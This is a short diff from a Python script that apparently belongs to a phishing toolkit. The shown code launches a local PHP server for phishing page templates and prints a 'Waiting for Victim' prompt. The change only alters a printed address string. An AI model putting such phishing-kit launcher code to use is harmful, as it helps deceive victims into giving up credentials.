@@ -593,7 +593,7 @@ exit();""")
       time.sleep(0.07)
       with open("log","w") as phplog:
          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Hosted at : http://127.0.0.1:6060")
+      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Hosted at : "+Fore.BLUE+"localhost:6060")
       time.sleep(0.07)
       print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for Victim, "+Fore.BLUE+"Ctrl + C "+Fore.YELLOW+"to exit...")
     elif v == "02":
